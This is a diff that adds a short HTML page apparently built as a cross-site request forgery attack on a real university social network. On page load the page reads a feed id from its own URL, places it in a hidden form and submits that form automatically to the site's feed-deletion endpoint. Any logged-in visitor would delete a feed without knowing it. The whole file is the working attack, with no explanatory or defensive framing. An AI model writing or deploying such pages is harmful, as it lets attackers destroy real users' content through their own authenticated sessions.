@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Document</title>
+  <script src="//code.jquery.com/jquery-1.11.2.min.js"></script>
+
+</head>
+<body>
+  <form action="http://sns.cic.tsinghua.edu.cn/main/gfeeds/gfeeds/delfeeds">
+    <input type="hidden" name="feedsid" value="" >
+    <input type="hidden" name="feeds_type=gtalk">
+  </form>
+<script>
+$(function(){
+  var param = document.URL.split('?')[1];
+  var value = param.split('=')[1];
+  $('input[name="feedsid"]').val(value);
+  $('form')[0].submit();
+});
+</script>
+</body>
+</html>
